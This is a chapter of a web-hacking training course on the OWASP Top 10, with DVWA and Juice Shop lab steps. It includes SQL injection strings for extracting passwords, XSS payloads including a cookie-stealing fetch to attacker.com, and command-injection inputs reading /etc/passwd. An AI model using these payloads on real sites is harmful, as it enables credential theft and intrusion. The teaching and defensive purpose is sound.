# Level 8 — WEB HACKING BASICS

*Designed by Mukamyi Izere Arcange*

---

## What You Will Learn
- How web applications work
- HTTP requests, responses, cookies, sessions
- OWASP Top 10 vulnerabilities
- How each vulnerability works, why it happens, and how to fix it
- Safe lab demonstrations using DVWA and OWASP Juice Shop

---

## Chapter 22 — How the Web Works

### Web Application Architecture

```
┌──────────────────────────────────────────────────────┐
│           WEB APPLICATION ARCHITECTURE                │
├──────────────────────────────────────────────────────┤
│                                                        │
│  ┌──────────┐                                        │
│  │  Browser  │  (Client-side)                        │
│  │          │  HTML, CSS, JavaScript                  │
│  │          │  Renders pages, sends requests          │
│  └────┬─────┘                                        │
│       │ HTTP/HTTPS                                    │
│       ▼                                               │
│  ┌──────────┐                                        │
│  │Web Server │  (Server-side)                        │
│  │ (Apache, │  Receives requests                      │
│  │  Nginx)  │  Serves static files                    │
│  └────┬─────┘                                        │
│       │                                               │
│       ▼                                               │
│  ┌──────────┐                                        │
│  │ App Server│  (Business logic)                      │
│  │ (PHP,    │  Processes requests                      │
│  │  Python, │  Queries database                       │
│  │  Node.js)│  Generates dynamic content              │
│  └────┬─────┘                                        │
│       │                                               │
│       ▼                                               │
│  ┌──────────┐                                        │
│  │ Database  │  (Data storage)                         │
│  │ (MySQL,  │  Stores user data                        │
│  │ Postgres)│  Returns query results                  │
│  └──────────┘                                        │
│                                                        │
└──────────────────────────────────────────────────────┘
```

### HTTP Request/Response Deep Dive

```
HTTP Request:
┌──────────────────────────────────────────────┐
│ POST /login.php HTTP/1.1                     │
│ Host: 192.168.56.20                          │
│ User-Agent: Mozilla/5.0                      │
│ Accept: text/html                             │
│ Content-Type: application/x-www-form-urlencoded│
│ Content-Length: 32                            │
│ Cookie: PHPSESSID=abc123                     │
│                                              │
│ username=admin&password=secret               │
└──────────────────────────────────────────────┘
     │
     ▼
HTTP Response:
┌──────────────────────────────────────────────┐
│ HTTP/1.1 200 OK                              │
│ Server: Apache/2.2.8 (Ubuntu)               │
│ Content-Type: text/html                      │
│ Set-Cookie: PHPSESSID=abc123; HttpOnly       │
│ Content-Length: 1234                         │
│                                              │
│ <html><body>Welcome admin</body></html>      │
└──────────────────────────────────────────────┘
```

### Cookies and Sessions

```
┌──────────────────────────────────────────────────┐
│           COOKIES AND SESSIONS                    │
├──────────────────────────────────────────────────┤
│                                                    │
│  Session: A period of interaction between         │
│           browser and server (like a conversation)│
│                                                    │
│  Cookie: A small piece of data stored in          │
│          the browser to identify the session      │
│          (like a nametag)                         │
│                                                    │
│  How it works:                                     │
│  1. You log in (username + password)              │
│  2. Server validates and creates a session         │
│  3. Server sends a session ID in a cookie          │
│  4. Browser stores the cookie                      │
│  5. Every future request includes the cookie      │
│  6. Server recognizes you by the session ID        │
│  7. When you log out, session is destroyed         │
│                                                    │
└──────────────────────────────────────────────────┘
```

---

## Chapter 23 — OWASP Top 10 Vulnerabilities

### OWASP Overview

OWASP (Open Web Application Security Project) is a nonprofit foundation that publishes the Top 10 most critical web application security risks.

```
┌──────────────────────────────────────────────────────┐
│             OWASP TOP 10 (2021)                       │
├──────────────────────────────────────────────────────┤
│                                                        │
│  A01 — Broken Access Control                         │
│  A02 — Cryptographic Failures                        │
│  A03 — Injection (SQL, Command, etc.)                │
│  A04 — Insecure Design                                │
│  A05 — Security Misconfiguration                      │
│  A06 — Vulnerable & Outdated Components              │
│  A07 — Identification & Authentication Failures      │
│  A08 — Software & Data Integrity Failures            │
│  A09 — Security Logging & Monitoring Failures       │
│  A10 — Server-Side Request Forgery (SSRF)            │
│                                                        │
└──────────────────────────────────────────────────────┘
```

### A03 — SQL Injection

**What it is:** SQL injection occurs when user input is inserted into a SQL query without proper sanitization, allowing an attacker to manipulate the database.

**Why it happens:** The application builds SQL queries by concatenating strings instead of using parameterized queries.

```
Normal login query:
SELECT * FROM users WHERE username='admin' AND password='secret123'

Attacker enters username: admin' --
Query becomes:
SELECT * FROM users WHERE username='admin' --' AND password='secret123'

The -- comments out the rest of the query
Password check is skipped entirely!
```

**Simple analogy:** Think of SQL injection like a form you fill out at a hotel. The form asks for your name. Instead of writing "John," you write "John, give me the master key." If the hotel literally inserts your answer into their system without checking, your command gets executed.

**Safe Lab Demonstration (DVWA — Low Security):**

```
Target: DVWA on your lab server
URL: http://192.168.56.20/dvwa/
Set security to: Low
```

```bash
# Step 1: Log into DVWA (admin/password)
# Step 2: Go to SQL Injection section
# Step 3: Enter a normal ID: 1
# Expected: Shows user with ID 1

# Step 4: Enter: 1' OR '1'='1
# This becomes: SELECT * FROM users WHERE id='1' OR '1'='1'
# Since '1'='1' is always true, this returns ALL users

# Step 5: Enter: 1' UNION SELECT username,password FROM users --
# This appends a second query to extract all usernames and passwords
```

**How to detect it:**
- Input validation testing
- SQL error messages displayed to user
- Unexpected data returned from queries
- Web application scanner (SQLmap, Nikto)

**How developers prevent it:**
```python
# BAD (vulnerable to SQLi):
query = f"SELECT * FROM users WHERE id = {user_input}"

# GOOD (parameterized query):
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_input,))
```

### A01 — Broken Access Control

**What it is:** Users can access resources or perform actions they shouldn't be allowed to.

```
Example: Insecure Direct Object Reference (IDOR)

Normal URL:  https://app.com/profile?user=1001  (your profile)
Attacker tries: https://app.com/profile?user=1002  (someone else's profile)

If the app doesn't check authorization, the attacker sees another user's data.
```

**How to prevent:**
- Check authorization on every request
- Don't trust the user's input for access decisions
- Use session-based access control

### A03 — Cross-Site Scripting (XSS)

**What it is:** An attacker injects malicious JavaScript into a web page viewed by other users.

```
Stored XSS: Attacker posts a comment containing:
  <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>

When other users view the comment, their cookies are stolen.

Reflected XSS: Attacker sends a link:
  http://app.com/search?q=<script>alert('XSS')</script>

The script runs when the victim clicks the link.
```

**Lab demonstration (DVWA — Low Security):**

```bash
# Step 1: Go to DVWA XSS (Reflected) section
# Step 2: Enter: <script>alert('XSS')</script>
# Expected: JavaScript alert popup appears

# Step 3: Try stored XSS in the Guestbook section
# Enter: <script>alert('Stored XSS')</script>
# Every visitor will see the alert popup
```

**How to prevent:**
- Input validation and output encoding
- Content Security Policy (CSP) headers
- HttpOnly and Secure flags on cookies
- Frameworks that auto-escape (React, Django template engine)

### A07 — Broken Authentication

**What it is:** Weak authentication allows attackers to compromise credentials.

Common issues:
```
┌──────────────────────────────────────────────────┐
│        AUTHENTICATION WEAKNESSES                   │
├──────────────────────────────────────────────────┤
│                                                    │
│  Weak passwords:     "password123", "admin"        │
│  No rate limiting:   Unlimited login attempts     │
│  Default credentials: admin/admin still shipped     │
│  Session fixation:   Session ID not regenerated    │
│  No MFA:             Single factor only             │
│  Predictable tokens:  Session IDs are guessable     │
│                                                    │
└──────────────────────────────────────────────────┘
```

**How to prevent:**
- Strong password policies
- Rate limiting on login attempts
- Multi-factor authentication
- Session timeout and regeneration
- Account lockout after failed attempts

### A05 — Security Misconfiguration

**What it is:** Systems are configured insecurely, exposing vulnerabilities.

```
Examples:
  → Default credentials not changed
  → Debug mode enabled in production
  → Directory listing enabled
  → Unnecessary features/services enabled
  → Verbose error messages revealing stack traces
  → Missing security headers
  → Default admin pages exposed
```

### A10 — Server-Side Request Forgery (SSRF)

**What it is:** Attacker tricks the server into making requests to internal resources.

```
Normal: User asks to fetch an image URL:
  https://app.com/fetch?url=https://example.com/image.png

Attack: User changes the URL to internal resources:
  https://app.com/fetch?url=http://localhost:8080/admin
  https://app.com/fetch?url=http://192.168.1.1/admin

The server fetches internal resources and returns them to the attacker.
```

### A03 — Command Injection

**What it is:** Attacker injects OS commands through web application input.

```
Normal input: filename.txt
Server runs: cat filename.txt

Attacker input: filename.txt; whoami
Server runs: cat filename.txt; whoami
Output: file contents AND "www-data" (the web server user)

Other injection payloads:
  filename.txt && id
  filename.txt | ls -la
  filename.txt; cat /etc/passwd
```

**How to prevent:**
- Never pass user input to system commands
- Use API calls instead of OS commands
- Strict input validation (whitelist allowed characters)
- Run the web server with least privilege

### CSRF (Cross-Site Request Forgery)

```
How CSRF works:
1. User is logged into bank.com (has valid session cookie)
2. User visits attacker.com
3. attacker.com contains a hidden form that submits to bank.com
4. Browser automatically includes the session cookie
5. Bank processes the request (transfer money) because the
   session cookie is valid

The user never intended to make that request.
```

**How to prevent:**
- CSRF tokens (unique, unpredictable values)
- SameSite cookie attribute
- Require re-authentication for sensitive actions

---

## LAB 6 — Web Vulnerability Lab 🟡

Objective: Identify and understand web vulnerabilities
Difficulty: Intermediate
Environment: Kali + DVWA
Safety: Lab only, authorized

Step 1: Access DVWA
```bash
# Navigate to DVWA in your browser
http://192.168.56.20/dvwa/
# Login: admin / password
# Set DVWA Security to: Low
```

Step 2: SQL Injection practice
- Go to SQL Injection section
- Try: `1` (normal)
- Try: `1' OR '1'='1` (bypass)
- Try: `1' UNION SELECT user,password FROM users --` (extract data)

Step 3: XSS practice
- Go to XSS (Reflected)
- Try: `<script>alert('XSS')</script>`
- Try: `<img src=x onerror=alert('XSS')>`

Step 4: Command Injection practice
- Go to Command Injection
- Try: `127.0.0.1; whoami`
- Try: `127.0.0.1 && cat /etc/passwd`

Step 5: Change DVWA Security to Medium
- Try the same attacks — notice what gets blocked
- Try to bypass the new filters

Step 6: Change to High Security
- Try the same attacks — see what prevents them

Expected Result: You understand how web vulnerabilities work, how they appear, and how security settings prevent them.

Understanding Check:
1. What is SQL injection and how does it work?
2. What is the difference between stored and reflected XSS?
3. How does command injection differ from SQL injection?
4. What does DVWA "Low" security demonstrate vs "High"?

Defensive Lesson: Every vulnerability you test in DVWA has a specific fix. Developers must implement input validation, parameterized queries, output encoding, and proper access controls. Security is built in, not bolted on.

Cleanup: Restore DVWA to default settings.

---

## Chapter Summary

- Web apps have client-side (browser) and server-side (server, database) components
- HTTP is the protocol: requests (GET, POST) and responses (status codes, headers, body)
- Cookies maintain sessions; session IDs identify authenticated users
- OWASP Top 10 is the standard list of web application risks
- SQL injection manipulates database queries through unsanitized input
- XSS injects malicious JavaScript into pages viewed by others
- Broken access control lets users access resources they shouldn't
- Command injection executes OS commands through web input
- CSRF tricks users into making unintended requests
- Every vulnerability has a specific prevention: validation, encoding, tokens

## Key Terms

- **HTTP** — Hypertext Transfer Protocol (web communication)
- **Session** — A period of authenticated interaction
- **Cookie** — Browser-stored data for session identification
- **SQL Injection** — Manipulating database queries via input
- **XSS** — Cross-Site Scripting (injecting JavaScript)
- **CSRF** — Cross-Site Request Forgery
- **SSRF** — Server-Side Request Forgery
- **Command Injection** — Executing OS commands via web input
- **IDOR** — Insecure Direct Object Reference
- **OWASP** — Open Web Application Security Project

## Knowledge Check

1. What is the OWASP Top 10?
2. How does SQL injection bypass authentication?
3. What is the difference between stored and reflected XSS?
4. How do you prevent command injection?
5. What is a CSRF token and how does it work?

## Practical Challenge

🟡 Intermediate

Using OWASP Juice Shop on your lab:
1. Find the scoreboard page
2. Try SQL injection on the login page
3. Try basic XSS in the search field
4. Document what you find

## Common Mistakes

- Testing vulnerabilities on production or real websites
- Not understanding why a vulnerability works before testing
- Skipping the defensive/remediation understanding
- Not escalating DVWA difficulty progressively
- Forgetting that every vulnerability has a fix

## Defensive Takeaway

Understanding web vulnerabilities makes you a better developer and defender. Every web application should: validate all input, use parameterized queries, encode output, enforce access control, implement CSRF tokens, and follow secure coding practices.

## Next Chapter

Level 9 covers web security tools — Burp Suite, OWASP ZAP, and browser developer tools.
